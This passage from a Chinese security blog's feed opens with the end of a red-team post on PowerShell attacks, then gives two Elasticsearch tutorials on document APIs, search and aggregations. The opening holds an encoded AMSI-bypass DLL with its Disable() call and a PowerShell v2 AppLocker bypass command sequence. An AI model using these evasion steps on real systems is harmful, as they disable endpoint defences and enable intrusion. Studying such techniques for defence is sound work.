GcAYQBsAFQAcgBhAGQAZQBtAGEAcgBrAHMAAAAAAAAAAABGAA8AAQBPAHIAaQBnAGkAbgBhAGwARgBpAGwAZQBuAGEAbQBlAAAAQgB5AHAAYQBzAHMAQQBNAFMASQAuAGQAbABsAAAAAAA2AAsAAQBQAHIAbwBkAHUAYwB0AE4AYQBtAGUAAAAAAEIAeQBwAGEAcwBzAEEATQBTAEkAAAAAADQACAABAFAAcgBvAGQAdQBjAHQAVgBlAHIAcwBpAG8AbgAAADEALgAwAC4AMAAuADAAAAA4AAgAAQBBAHMAcwBlAG0AYgBsAHkAIABWAGUAcgBzAGkAbwBuAAAAMQAuADAALgAwAC4AMAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAIAAADAAAAMgquot;)) | Out-Null</span><br><span class="line">        Write-Output &quot;DLL has been reflected&quot;;</span><br><span class="line">    &#125;</span><br><span class="line">    [Bypass.AMSI]::Disable()</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li></ol><h3 id="AppLocker"><a href="#AppLocker" class="headerlink" title="AppLocker"></a>AppLocker</h3><p>限制脚本，dll等可执行文件的执行</p><h4 id="绕过-1"><a href="#绕过-1" class="headerlink" title="绕过"></a>绕过</h4><p>作为非特权用户，我们可以通过调用PowerShell版本2（注意：必须已经启用），然后利用CL_LoadAssembly.ps1加载程序集来绕过AppLocker，从而绕过约束语言模式。为了完整起见，这里给出相应的命令序列：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">powershell -v 2 -ep bypass</span><br><span class="line">cd C:\windows\diagnostics\system\AERO</span><br><span class="line">import-module .\CL_LoadAssembly.ps1</span><br><span class="line">LoadAssemblyFromPath ..\..\..\..\temp\funrun.exe</span><br><span class="line">[funrun.hashtag]::winning()</span><br></pre></td></tr></table></figure></p><p>常用绕过技术参考：<a href="https://github.com/api0cradle/UltimateAppLockerByPassList" target="_blank" rel="noopener">https://github.com/api0cradle/UltimateAppLockerByPassList</a></p><p>参考<br><a href="https://www.symantec.com/content/dam/symantec/docs/security-center/white-papers/increased-use-of-powershell-in-attacks-16-en.pdf" target="_blank" rel="noopener">https://www.symantec.com/content/dam/symantec/docs/security-center/white-papers/increased-use-of-powershell-in-attacks-16-en.pdf</a><br><a href="https://www.cnblogs.com/sparkdev/p/7460518.html" target="_blank" rel="noopener">https://www.cnblogs.com/sparkdev/p/7460518.html</a><br><a href="https://xz.aliyun.com/t/3095" target="_blank" rel="noopener">https://xz.aliyun.com/t/3095</a><br><a href="https://xz.aliyun.com/t/2247" target="_blank" rel="noopener">https://xz.aliyun.com/t/2247</a></p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;本文大部分内容来自参考中的英文文档，根据笔者理解和google翻译写出本文。&lt;/p&gt;
&lt;h3 id=&quot;主要讨论&quot;&gt;&lt;a href=&quot;#主要讨论&quot; class=&quot;headerlink&quot; title=&quot;主要讨论&quot;&gt;&lt;/a&gt;主要讨论&lt;/h3&gt;&lt;p&gt;Powershell用于攻击的不同阶段，攻击框架的使用，攻击中遇到的问题&lt;/p&gt;
&lt;h3 id=&quot;脚本执行策略&quot;&gt;&lt;a href=&quot;#脚本执行策略&quot; class=&quot;headerlink&quot; title=&quot;脚本执行策略&quot;&gt;&lt;/a&gt;脚本执行策略&lt;/h3&gt;&lt;p&gt;查看当前系统的策略&lt;br&gt;powershell为了防护恶意脚本的执行，设置了相应的执行策略。&lt;br&gt;&lt;code&gt;Get-ExecutionPolicy&lt;/code&gt;&lt;br&gt;查看系统支持的所有策略&lt;br&gt;&lt;code&gt;[System.Enum]::GetNames([Microsoft.PowerShell.ExecutionPolicy])&lt;/code&gt;&lt;br&gt;&lt;img src=&quot;/images/celue.png&quot; alt=&quot;&quot;&gt;&lt;/p&gt;
    
    </summary>
    
    
      <category term="powershell,渗透,红队" scheme="https://s0lt.github.io/tags/powershell-%E6%B8%97%E9%80%8F-%E7%BA%A2%E9%98%9F/"/>
    
  </entry>
  
  <entry>
    <title>Elasticsearch学习（二）</title>
    <link href="https://s0lt.github.io/2019/02/25/Elasticsearch%E5%AD%A6%E4%B9%A0(%E4%BA%8C%EF%BC%89/"/>
    <id>https://s0lt.github.io/2019/02/25/Elasticsearch学习(二）/</id>
    <published>2019-02-24T23:50:24.000Z</published>
    <updated>2019-02-28T01:06:30.152Z</updated>
    
    <content type="html"><![CDATA[<p>使用API来创建、检索、更新和删除文档</p><p>###文档<br>文档可以理解为和对象（JSON键值对结构体，）类似。</p><h4 id="文档元数据"><a href="#文档元数据" class="headerlink" title="文档元数据"></a>文档元数据</h4><p>一个文档不只有数据。它还包含了<strong>元数据(metadata)</strong>——<strong>关于</strong>文档的信息。三个必须的元数据节点是：</p><table><thead><tr><th>节点</th><th>说明</th></tr></thead><tbody><tr><td>_index</td><td>文档存储的地方，类似关系型数据库中的“数据库”，但索引是分片的逻辑存储空间，数据被存储和索引在分片中。索引名字必须是全部小写，不能以下划线开头，不能包含逗号</td></tr><tr><td>_type</td><td>文档代表的对象的类，<code>_type</code>的名字可以是大写或小写，不能包含下划线或逗号</td></tr><tr><td>_id</td><td>文档的唯一标识</td></tr><tr><td>_version</td><td>文档版本号，每当文档变化（包括删除）都会使<code>_version</code>增加</td></tr><tr><td>_source</td><td>创建索引时发送的原始文档,GET /website/blog/123?_source=title,text</td></tr></tbody></table><a id="more"></a><h4 id="索引"><a href="#索引" class="headerlink" title="索引"></a>索引</h4><p>自定义文档ID<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">PUT /&#123;index&#125;/&#123;type&#125;/&#123;id&#125;</span><br><span class="line">&#123;</span><br><span class="line">  &quot;field&quot;: &quot;value&quot;,</span><br><span class="line">  ...</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>设置自增ID，使用POST，只需要_index和_type<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">POST /website/blog/</span><br><span class="line">&#123;</span><br><span class="line">  &quot;title&quot;: &quot;My second blog entry&quot;,</span><br><span class="line">  &quot;text&quot;:  &quot;Still trying this out...&quot;,</span><br><span class="line">  &quot;date&quot;:  &quot;2014/01/01&quot;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><h4 id="someAPI"><a href="#someAPI" class="headerlink" title="someAPI"></a>someAPI</h4><p>_update合并更新到文档中<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">POST /website/blog/1/_update</span><br></pre></td></tr></table></figure></p><p><code>mget</code> API参数是一个<code>docs</code>数组，数组的每个节点定义一个文档的<code>_index</code>、<code>_type</code>、<code>_id</code>元数据。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">POST /website/blog/_mget</span><br><span class="line">&#123;</span><br><span class="line">   &quot;docs&quot; : [</span><br><span class="line">      &#123; &quot;_id&quot; : 2 &#125;,</span><br><span class="line">      &#123; &quot;_type&quot; : &quot;pageviews&quot;, &quot;_id&quot; :   1 &#125;</span><br><span class="line">   ]</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p><code>bulk</code> API允许我们使用单一请求来实现多个文档的<code>create</code>、<code>index</code>、<code>update</code>或<code>delete</code>。<br>暂时到这里，很多东西遇到后在来总结。</p><h4 id="空搜索"><a href="#空搜索" class="headerlink" title="空搜索"></a>空搜索</h4><p>测试用例：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line">POST /_bulk</span><br><span class="line">&#123; &quot;create&quot;: &#123; &quot;_index&quot;: &quot;user&quot;, &quot;_type&quot;: &quot;doc&quot;, &quot;_id&quot;: &quot;1&quot; &#125;&#125;</span><br><span class="line">&#123; &quot;email&quot; : &quot;john@smith.com&quot;, &quot;name&quot; : &quot;John Smith&quot;, &quot;username&quot; : &quot;@john&quot; &#125;</span><br><span class="line">&#123; &quot;create&quot;: &#123; &quot;_index&quot;: &quot;user&quot;, &quot;_type&quot;: &quot;doc&quot;, &quot;_id&quot;: &quot;2&quot; &#125;&#125;</span><br><span class="line">&#123; &quot;email&quot; : &quot;mary@jones.com&quot;, &quot;name&quot; : &quot;Mary Jones&quot;, &quot;username&quot; : &quot;@mary&quot; &#125;</span><br><span class="line">&#123; &quot;create&quot;: &#123; &quot;_index&quot;: &quot;tweet&quot;, &quot;_type&quot;: &quot;doc&quot;, &quot;_id&quot;: &quot;3&quot; &#125;&#125;</span><br><span class="line">&#123; &quot;date&quot; : &quot;2014-09-13&quot;, &quot;name&quot; : &quot;Mary Jones&quot;, &quot;tweet&quot; : &quot;Elasticsearch means full text search has never been so easy&quot;, &quot;user_id&quot; : 2 &#125;</span><br><span class="line">&#123; &quot;create&quot;: &#123; &quot;_index&quot;: &quot;tweet&quot;, &quot;_type&quot;: &quot;doc&quot;, &quot;_id&quot;: &quot;4&quot; &#125;&#125;</span><br><span class="line">&#123; &quot;date&quot; : &quot;2014-09-14&quot;, &quot;name&quot; : &quot;John Smith&quot;, &quot;tweet&quot; : &quot;@mary it is not just text, it does everything&quot;, &quot;user_id&quot; : 1 &#125;</span><br><span class="line">&#123; &quot;create&quot;: &#123; &quot;_index&quot;: &quot;tweet&quot;, &quot;_type&quot;: &quot;doc&quot;, &quot;_id&quot;: &quot;5&quot; &#125;&#125;</span><br><span class="line">&#123; &quot;date&quot; : &quot;2014-09-15&quot;, &quot;name&quot; : &quot;Mary Jones&quot;, &quot;tweet&quot; : &quot;However did I manage before Elasticsearch?&quot;, &quot;user_id&quot; : 2 &#125;</span><br><span class="line">&#123; &quot;create&quot;: &#123; &quot;_index&quot;: &quot;tweet&quot;, &quot;_type&quot;: &quot;doc&quot;, &quot;_id&quot;: &quot;6&quot; &#125;&#125;</span><br><span class="line">&#123; &quot;date&quot; : &quot;2014-09-16&quot;, &quot;name&quot; : &quot;John Smith&quot;,  &quot;tweet&quot; : &quot;The Elasticsearch API is really easy to use&quot;, &quot;user_id&quot; : 1 &#125;</span><br><span class="line">&#123; &quot;create&quot;: &#123; &quot;_index&quot;: &quot;tweet&quot;, &quot;_type&quot;: &quot;doc&quot;, &quot;_id&quot;: &quot;7&quot; &#125;&#125;</span><br><span class="line">&#123; &quot;date&quot; : &quot;2014-09-17&quot;, &quot;name&quot; : &quot;Mary Jones&quot;, &quot;tweet&quot; : &quot;The Query DSL is really powerful and flexible&quot;, &quot;user_id&quot; : 2 &#125;</span><br><span class="line">&#123; &quot;create&quot;: &#123; &quot;_index&quot;: &quot;tweet&quot;, &quot;_type&quot;: &quot;doc&quot;, &quot;_id&quot;: &quot;8&quot; &#125;&#125;</span><br><span class="line">&#123; &quot;date&quot; : &quot;2014-09-18&quot;, &quot;name&quot; : &quot;John Smith&quot;, &quot;user_id&quot; : 1 &#125;</span><br><span class="line">&#123; &quot;create&quot;: &#123; &quot;_index&quot;: &quot;tweet&quot;, &quot;_type&quot;: &quot;doc&quot;, &quot;_id&quot;: &quot;9&quot; &#125;&#125;</span><br><span class="line">&#123; &quot;date&quot; : &quot;2014-09-19&quot;, &quot;name&quot; : &quot;Mary Jones&quot;, &quot;tweet&quot; : &quot;Geo-location aggregations are really cool&quot;, &quot;user_id&quot; : 2 &#125;</span><br><span class="line">&#123; &quot;create&quot;: &#123; &quot;_index&quot;: &quot;tweet&quot;, &quot;_type&quot;: &quot;doc&quot;, &quot;_id&quot;: &quot;10&quot; &#125;&#125;</span><br><span class="line">&#123; &quot;date&quot; : &quot;2014-09-20&quot;, &quot;name&quot; : &quot;John Smith&quot;, &quot;tweet&quot; : &quot;Elasticsearch surely is one of the hottest new NoSQL products&quot;, &quot;user_id&quot; : 1 &#125;</span><br><span class="line">&#123; &quot;create&quot;: &#123; &quot;_index&quot;: &quot;tweet&quot;, &quot;_type&quot;: &quot;doc&quot;, &quot;_id&quot;: &quot;11&quot; &#125;&#125;</span><br><span class="line">&#123; &quot;date&quot; : &quot;2014-09-21&quot;, &quot;name&quot; : &quot;Mary Jones&quot;, &quot;tweet&quot; : &quot;Elasticsearch is built for the cloud, easy to scale&quot;, &quot;user_id&quot; : 2 &#125;</span><br><span class="line">&#123; &quot;create&quot;: &#123; &quot;_index&quot;: &quot;tweet&quot;, &quot;_type&quot;: &quot;doc&quot;, &quot;_id&quot;: &quot;12&quot; &#125;&#125;</span><br><span class="line">&#123; &quot;date&quot; : &quot;2014-09-22&quot;, &quot;name&quot; : &quot;John Smith&quot;, &quot;tweet&quot; : &quot;Elasticsearch and I have left the honeymoon stage, and I still love her.&quot;, &quot;user_id&quot; : 1 &#125;</span><br><span class="line">&#123; &quot;create&quot;: &#123; &quot;_index&quot;: &quot;tweet&quot;, &quot;_type&quot;: &quot;doc&quot;, &quot;_id&quot;: &quot;13&quot; &#125;&#125;</span><br><span class="line">&#123; &quot;date&quot; : &quot;2014-09-23&quot;, &quot;name&quot; : &quot;Mary Jones&quot;, &quot;tweet&quot; : &quot;So yes, I am an Elasticsearch fanboy&quot;, &quot;user_id&quot; : 2 &#125;</span><br><span class="line">&#123; &quot;create&quot;: &#123; &quot;_index&quot;: &quot;tweet&quot;, &quot;_type&quot;: &quot;doc&quot;, &quot;_id&quot;: &quot;14&quot; &#125;&#125;</span><br><span class="line">&#123; &quot;date&quot; : &quot;2014-09-24&quot;, &quot;name&quot; : &quot;John Smith&quot;, &quot;tweet&quot; : &quot;How many more cheesy tweets do I have to write?&quot;, &quot;user_id&quot; : 1 &#125;</span><br></pre></td></tr></table></figure></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">GET /_search</span><br></pre></td></tr></table></figure><p><img src="/images/_search.png" alt=""><br><code>took</code>告诉我们整个搜索请求花费的毫秒数。<br><code>_shards</code>节点告诉我们参与查询的分片数（<code>total</code>字段），有多少是成功的（<code>successful</code>字段），有多少的是失败的（<code>failed</code>字段）。<br><code>time_out</code>值告诉我们查询超时与否</p><h4 id="多索引多类别"><a href="#多索引多类别" class="headerlink" title="多索引多类别"></a>多索引多类别</h4><p> <code>/_search</code><br>在所有索引的所有类型中搜索<br><code>/gb/_search</code><br>在索引<code>gb</code>的所有类型中搜索<br><code>/gb,us/_search</code><br>在索引<code>gb</code>和<code>us</code>的所有类型中搜索<br><code>/g*,u*/_search</code><br>在以<code>g</code>或<code>u</code>开头的索引的所有类型中搜索<br> <code>/gb/user/_search</code><br>在索引<code>gb</code>的类型<code>user</code>中搜索<br><code>/gb,us/user,tweet/_search</code><br>在索引<code>gb</code>和<code>us</code>的类型为<code>user</code>和<code>tweet</code>中搜索<br> <code>/_all/user,tweet/_search</code><br>在所有索引的<code>user</code>和<code>tweet</code>中搜索 search types  <code>user</code>  and  <code>tweet</code>  in all indices</p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;使用API来创建、检索、更新和删除文档&lt;/p&gt;
&lt;p&gt;###文档&lt;br&gt;文档可以理解为和对象（JSON键值对结构体，）类似。&lt;/p&gt;
&lt;h4 id=&quot;文档元数据&quot;&gt;&lt;a href=&quot;#文档元数据&quot; class=&quot;headerlink&quot; title=&quot;文档元数据&quot;&gt;&lt;/a&gt;文档元数据&lt;/h4&gt;&lt;p&gt;一个文档不只有数据。它还包含了&lt;strong&gt;元数据(metadata)&lt;/strong&gt;——&lt;strong&gt;关于&lt;/strong&gt;文档的信息。三个必须的元数据节点是：&lt;/p&gt;
&lt;table&gt;
&lt;thead&gt;
&lt;tr&gt;
&lt;th&gt;节点&lt;/th&gt;
&lt;th&gt;说明&lt;/th&gt;
&lt;/tr&gt;
&lt;/thead&gt;
&lt;tbody&gt;
&lt;tr&gt;
&lt;td&gt;_index&lt;/td&gt;
&lt;td&gt;文档存储的地方，类似关系型数据库中的“数据库”，但索引是分片的逻辑存储空间，数据被存储和索引在分片中。索引名字必须是全部小写，不能以下划线开头，不能包含逗号&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;_type&lt;/td&gt;
&lt;td&gt;文档代表的对象的类，&lt;code&gt;_type&lt;/code&gt;的名字可以是大写或小写，不能包含下划线或逗号&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;_id&lt;/td&gt;
&lt;td&gt;文档的唯一标识&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;_version&lt;/td&gt;
&lt;td&gt;文档版本号，每当文档变化（包括删除）都会使&lt;code&gt;_version&lt;/code&gt;增加&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;_source&lt;/td&gt;
&lt;td&gt;创建索引时发送的原始文档,GET /website/blog/123?_source=title,text&lt;/td&gt;
&lt;/tr&gt;
&lt;/tbody&gt;
&lt;/table&gt;
    
    </summary>
    
    
      <category term="Elasticsearch" scheme="https://s0lt.github.io/tags/Elasticsearch/"/>
    
  </entry>
  
  <entry>
    <title>Elasticsearch学习（一）</title>
    <link href="https://s0lt.github.io/2019/02/21/Elasticsearch%E5%AD%A6%E4%B9%A0%EF%BC%88%E4%B8%80%EF%BC%89/"/>
    <id>https://s0lt.github.io/2019/02/21/Elasticsearch学习（一）/</id>
    <published>2019-02-21T09:29:24.000Z</published>
    <updated>2019-02-28T01:06:49.971Z</updated>
    
    <content type="html"><![CDATA[<p>在Elasticsearch中，文档归属于一种类型(type),而这些类型存在于索引(index)中，我们可以画一些简单的对比图来类比传统关系型数据库：<br><code>Relational DB -&gt; Databases -&gt; Tables -&gt; Rows -&gt; Columns</code><br><code>Elasticsearch -&gt; Indices   -&gt; Types  -&gt; Documents -&gt; Fields</code></p><h3 id="搜索"><a href="#搜索" class="headerlink" title="搜索"></a>搜索</h3><h4 id="简单搜索"><a href="#简单搜索" class="headerlink" title="简单搜索"></a>简单搜索</h4><p>通过执行HTTP GET请求并指出文档的“地址”——索引、类型和ID既可。根据这三部分信息，我们就可以返回原始JSON文档：<br>我们通过HTTP方法<code>GET</code>来检索文档，同样的，我们可以使用<code>DELETE</code>方法删除文档，使用<code>HEAD</code>方法检查某文档是否存在。如果想更新已存在的文档，我们只需再<code>PUT</code>一次。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">GET /megacorp/employee/_search</span><br></pre></td></tr></table></figure></p><p>搜索全部文档，默认返回前10个结果，包含在hits数组中。<br>查询字符串搜索（姓氏中包含Smith的文档）<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">GET /megacorp/employee/_search?q=last_name:Smith</span><br></pre></td></tr></table></figure></p><a id="more"></a><h4 id="DSL语句查询：以JSON请求体的形式出现。（查询同上）"><a href="#DSL语句查询：以JSON请求体的形式出现。（查询同上）" class="headerlink" title="DSL语句查询：以JSON请求体的形式出现。（查询同上）"></a>DSL语句查询：以JSON请求体的形式出现。（查询同上）</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">GET /megacorp/employee/_search</span><br><span class="line">&#123;</span><br><span class="line">    &quot;query&quot; : &#123;</span><br><span class="line">        &quot;match&quot; : &#123;</span><br><span class="line">            &quot;last_name&quot; : &quot;Smith&quot;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="过滤器-filter），结构化搜索"><a href="#过滤器-filter），结构化搜索" class="headerlink" title="过滤器(filter），结构化搜索"></a>过滤器(filter），结构化搜索</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">GET /megacorp/employee/_search</span><br><span class="line">&#123;</span><br><span class="line">    &quot;query&quot; : &#123;</span><br><span class="line">        &quot;filtered&quot; : &#123;</span><br><span class="line">            &quot;filter&quot; : &#123;</span><br><span class="line">                &quot;range&quot; : &#123;</span><br><span class="line">                    &quot;age&quot; : &#123; &quot;gt&quot; : 30 &#125;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;,</span><br><span class="line">            &quot;query&quot; : &#123;</span><br><span class="line">                &quot;match&quot; : &#123;</span><br><span class="line">                    &quot;last_name&quot; : &quot;smith&quot;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>运行错误<br><img src="/images/error.png" alt=""><br>原因： 过滤查询已被弃用，并在ES 5.0中删除。<br>解决： 使用bool / must / filter查询<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">GET /megacorp/employee/_search</span><br><span class="line">&#123;</span><br><span class="line">    &quot;query&quot; : &#123;</span><br><span class="line">        &quot;bool&quot; : &#123;</span><br><span class="line">            &quot;filter&quot; : &#123;</span><br><span class="line">                &quot;range&quot; : &#123;</span><br><span class="line">                    &quot;age&quot; : &#123; &quot;gt&quot; : 30 &#125;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;,</span><br><span class="line">            &quot;must&quot; : &#123;</span><br><span class="line">                &quot;match&quot; : &#123;</span><br><span class="line">                    &quot;last_name&quot; : &quot;smith&quot;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><h4 id="全文搜索"><a href="#全文搜索" class="headerlink" title="全文搜索"></a>全文搜索</h4><p>搜索所有喜欢 <strong>“rock climbing”</strong> 的员工：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">GET /megacorp/employee/_search</span><br><span class="line">&#123;</span><br><span class="line">    &quot;query&quot; : &#123;</span><br><span class="line">        &quot;match&quot; : &#123;</span><br><span class="line">            &quot;about&quot; : &quot;rock climbing&quot;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>搜索结果会根据elasticsearch的相关性结果评分对文档进行排序。所谓相关性，就是搜索条件和文档的匹配程度。</p><h4 id="短词搜索"><a href="#短词搜索" class="headerlink" title="短词搜索"></a>短词搜索</h4><p>只要将<code>match</code>查询变更为<code>match_phrase</code>查询即可:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">GET /megacorp/employee/_search</span><br><span class="line">&#123;</span><br><span class="line">    &quot;query&quot; : &#123;</span><br><span class="line">        &quot;match_phrase&quot; : &#123;</span><br><span class="line">            &quot;about&quot; : &quot;rock climbing&quot;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="高亮搜索"><a href="#高亮搜索" class="headerlink" title="高亮搜索"></a>高亮搜索</h4><p>让我们在之前的语句上增加<code>highlight</code>参数：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">GET /megacorp/employee/_search</span><br><span class="line">&#123;</span><br><span class="line">    &quot;query&quot; : &#123;</span><br><span class="line">        &quot;match_phrase&quot; : &#123;</span><br><span class="line">            &quot;about&quot; : &quot;rock climbing&quot;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;,</span><br><span class="line">    &quot;highlight&quot;: &#123;</span><br><span class="line">        &quot;fields&quot; : &#123;</span><br><span class="line">            &quot;about&quot; : &#123;&#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><h3 id="聚合"><a href="#聚合" class="headerlink" title="聚合"></a>聚合</h3><p>允许在复杂的数据上生成统计。<br>例：找到所有职员中最大的共同点（兴趣爱好）是什么：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">GET /megacorp/employee/_search</span><br><span class="line">&#123;</span><br><span class="line">  &quot;aggs&quot;: &#123;</span><br><span class="line">    &quot;all_interests&quot;: &#123;</span><br><span class="line">      &quot;terms&quot;: &#123; &quot;field&quot;: &quot;interests&quot; &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>所有姓”Smith”的人最大的共同点（兴趣爱好），我们只需要增加合适的语句既可：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">GET /megacorp/employee/_search</span><br><span class="line">&#123;</span><br><span class="line">  &quot;query&quot;: &#123;</span><br><span class="line">    &quot;match&quot;: &#123;</span><br><span class="line">      &quot;last_name&quot;: &quot;smith&quot;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;,</span><br><span class="line">  &quot;aggs&quot;: &#123;</span><br><span class="line">    &quot;all_interests&quot;: &#123;</span><br><span class="line">      &quot;terms&quot;: &#123;</span><br><span class="line">        &quot;field&quot;: &quot;interests&quot;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>聚合也允许分级汇总。例如，让我们统计每种兴趣下职员的平均年龄：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">GET /megacorp/employee/_search</span><br><span class="line">&#123;</span><br><span class="line">    &quot;aggs&quot; : &#123;</span><br><span class="line">        &quot;all_interests&quot; : &#123;</span><br><span class="line">            &quot;terms&quot; : &#123; &quot;field&quot; : &quot;interests&quot; &#125;,</span><br><span class="line">            &quot;aggs&quot; : &#123;</span><br><span class="line">                &quot;avg_age&quot; : &#123;</span><br><span class="line">                    &quot;avg&quot; : &#123; &quot;field&quot; : &quot;age&quot; &#125;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p><em>注：所有例子来自Elasticsearch权威指南</em><br><a 